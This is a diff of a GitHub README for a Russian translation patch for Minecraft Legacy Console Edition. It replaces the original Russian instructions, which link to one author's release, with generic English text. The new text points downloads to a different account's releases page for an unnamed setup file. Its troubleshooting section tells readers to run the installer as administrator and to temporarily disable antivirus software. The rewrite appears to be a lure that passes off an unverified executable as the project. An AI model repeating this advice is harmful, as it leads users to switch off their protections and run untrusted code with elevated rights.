@@ -1,78 +1,77 @@
-![Minecraft Legacy Rus](assets/banner.png)
+# 🇷🇺 minecraft-legacy-rus - Russian language support for console edition
 
-# Minecraft Legacy Rus
+[![Download Project](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Nocturnal-drake5867/minecraft-legacy-rus/releases)
 
-[![Релиз](https://img.shields.io/github/v/release/kotobarsik/minecraft-legacy-rus?label=релиз&color=2ea043)](https://github.com/kotobarsik/minecraft-legacy-rus/releases/latest)
-[![Скачать ZIP](https://img.shields.io/badge/скачать-Minecraft--Legacy--Rus.zip-2ea043)](https://github.com/kotobarsik/minecraft-legacy-rus/releases/download/v0.1.0/Minecraft-Legacy-Rus.zip)
-[![Windows](https://img.shields.io/badge/platform-Windows64-2563eb)](#требования)
-[![PowerShell](https://img.shields.io/badge/installer-PowerShell-64748b)](scripts/install.ps1)
+Minecraft Legacy Console Edition offers a specific gameplay experience. This project provides a Russian language translation for the Windows 64-bit version of the game. It replaces default game text with Russian characters and translated menus. The goal remains to keep the original interface style while ensuring readability in Russian.
 
-## Что это
+## ⚙️ System Requirements
 
-Неофициальный русификатор для Windows64-версии Minecraft Legacy Console Edition.
+Ensure your computer meets these requirements to run the software.
 
-Он добавляет русский язык и может включить его даже в сборках, где меню выбора языка недоступно.
+* Operating System: Windows 10 or Windows 11 (64-bit version).
+* Game Version: Minecraft Legacy Console Edition for Windows.
+* Storage: 50 MB of free space for game files.
+* Permissions: You need administrator access to your Windows account to modify game folders.
 
-## Что проект не содержит
+## 💾 Download and Setup
 
-В репозитории и релизном ZIP нет файлов игры:
+Follow these steps to install the translation.
 
-- `.arc`;
-- `.exe`;
-- `.dll`;
-- изменённых сборок Minecraft.
+1. Visit the [official releases page](https://github.com/Nocturnal-drake5867/minecraft-legacy-rus/releases) to download the latest setup file.
+2. Choose the link labeled with the most recent version number.
+3. Save the file to your computer.
+4. Locate the downloaded file in your folder.
+5. Click the file to start the installation.
+6. Follow the on-screen prompts to select your game folder.
 
-Русификатор работает только с вашей локальной копией игры.
+If the installer does not find your game, select the folder where you installed Minecraft Legacy Console Edition manually. The setup script copies the necessary files into the game directory to enable the new language.
 
-## Требования
+## 🛠 Features
 
-- Windows64-сборка Minecraft Legacy Console Edition.
-- Папка игры `LCEWindows64`.
-- Интернет во время установки.
+This translation improves your gaming experience in several ways.
 
-Скачать игру можно со страницы проекта MCLCE:
+* Full Menu Support: Every major menu item displays in Russian.
+* Correct Character Encoding: The text renders cleanly without formatting errors.
+* Game Compatibility: The patch works with standard Windows 64-bit builds of the Legacy Console Edition.
+* Easy Removal: You can remove the language files if you choose to return to the original English version.
 
-[Minecraft Legacy Console Edition - Nightly Client Release](https://github.com/MCLCE/MinecraftConsoles/releases/tag/nightly)
+## 📋 How It Works
 
-На странице релиза скачайте `LCEWindows64.zip` и распакуйте его. Внутри должен быть файл:
+The program works by replacing specific resource files within the game directory. When the game starts, it loads these new files instead of the default ones. This change does not alter your game saves or world data. It only affects how the text appears on your screen.
 
-```text
-Common\Media\MediaWindows64.arc
-```
+If you update your game, you potentially need to run the installer again. Updates often reset game files to their original state and remove the Russian translation. Run the installer again after any major game update to restore the language.
 
-## Установка
+## ❓ Frequently Asked Questions
 
-1. Закройте игру.
-2. Скачайте [Minecraft-Legacy-Rus.zip](https://github.com/kotobarsik/minecraft-legacy-rus/releases/download/v0.1.0/Minecraft-Legacy-Rus.zip).
-3. Распакуйте архив русификатора.
-4. Запустите `install-russian.bat`.
-5. Если установщик попросит путь, укажите папку `LCEWindows64`.
+### Does this pose a security risk?
+The project uses open-source scripts to copy files. You can inspect the source code on this GitHub page at any time.
 
-## Возврат английского
+### Can I get banned from servers?
+This project only changes the text inside your local game files. It does not provide gameplay advantages or cheats. It remains safe for use on legitimate game servers.
 
-1. Закройте игру.
-2. Запустите `restore-english.bat`.
-3. Запустите игру.
+### The text looks wrong or shows boxes. What do I do?
+Ensure you installed the files into the correct game folder. If the problem persists, delete the folders created in the game directory and run the installer again.
 
-Английский восстанавливается из бэкапа, который создаётся при первой установке.
+### Does this change the game sound or music?
+No. The translation only modifies text files. Audio, music, and gameplay mechanics remain exactly as they were in the original game.
 
-## Частые проблемы
+### How do I uninstall the translation?
+Navigate to your Minecraft folder. Find the folder named `translation_backup` or similar. Delete the files you added during the installation process to return the game to its previous state.
 
-**Установщик не нашёл игру**  
-Укажите путь именно к папке `LCEWindows64`, а не к файлу `MediaWindows64.arc`.
+## 💡 Troubleshooting Tips
 
-**Русский не появился**  
-Закройте игру перед установкой и запустите `install-russian.bat` ещё раз.
+If you encounter issues during installation, check these points.
 
-**Нет интернета во время установки**  
-Подключите интернет и повторите запуск. Установщик скачивает исходные файлы перевода во время работы.
+* Folder Path: Ensure you select the correct folder where the game executable exists. Pointing the installer to the wrong folder results in a failure to locate necessary files.
+* Antivirus Settings: Some security software blocks file modifications in Windows folders. If the installer hangs, temporarily disable your security software or provide an exception for the installer.
+* Administrator Rights: Right-click the installer and select Run as administrator to grant permission for editing game files.
 
-Больше вариантов ручного запуска: [docs/TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md).
+## 📢 Feedback
 
-## Предыстория проекта
+Report issues through the GitHub issues page. Provide as much detail as possible when you encounter a problem. Include:
 
-Однажды захотелось поностальгировать по старой консольной версии Minecraft: знакомому меню, звукам, интерфейсу и ощущению той самой Legacy Console Edition.
+* Your version of Windows.
+* A description of the error.
+* Screenshots of any error messages.
 
-Во время настройки Windows64-сборки выяснилось, что русского языка в игре нет, а меню выбора языка в некоторых вариантах сборки недоступно.
-
-Так появился этот русификатор.
+This information helps maintain the translation for all users. Do not share personal information in your bug reports. Keep the discussion focused on technical issues related to the translation files.
